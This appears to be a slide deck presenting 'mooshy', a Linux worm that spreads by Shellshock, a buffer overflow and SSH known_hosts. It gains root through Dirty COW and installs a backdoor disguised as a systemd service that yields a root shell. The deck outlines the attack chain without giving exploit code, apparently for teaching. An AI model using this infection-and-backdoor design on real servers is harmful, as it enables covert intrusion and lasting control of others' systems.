% mooshy
% [ˈmuʃi]

# Introduction

## mooshy?
* Infection and execution of arbitrary code as root
* Targets Linux servers
* Exploits several user and kernel space vulns
* Written in Go with a touch of C

## Components
* `mooshy`: front-end for infection
* `moosh`: payload
* `cow`: exploit implementing Dirty COW
* `hhttpd`: a PoC web server to illustrate a buffer overflow

# 1. Infection

## Shellshock
* `$ mooshy -shellShock -addr ...`
* CVE-2014-6271
* Sends a GET request to the specified `addr`
* Embedded script downloads `moosh` and executes it

## Buffer overflow
* `$ mooshy -bufferOverflow -addr ...`
* Using buffer overflow in `hHTTPd`
* Injects shellcode
* Again, downloads `moosh` and executes it

## SSH
* `$ mooshy -ssh -addr ...` _or_ `-sshKnown`
* Uses regular SSH access
* Connects to `addr` or addresses in `known_hosts` file
* Copies and executes the `moosh` binary

# 2. Escalation

## Dirty COW
* CVE-2016-5195
* Gains root
* ![Dirty COW](https://upload.wikimedia.org/wikipedia/commons/1/1b/DirtyCow.svg)

# 3. Backdoor

## Installation
* Installs the backdoor on the system
* Disguised as `systemd-timesync` service
* Cleans up temporary files

## Invocation
```sh
$ mooshy -addr 192.168.56.102:22 # any open port
TCP socket opened on 0.0.0.0:42424
Received connection from 192.168.56.102:39414
root@cow:/# 
```

# Demo {data-background-image="https://media.giphy.com/media/Gr2A63jJz1fFe/giphy.gif"}

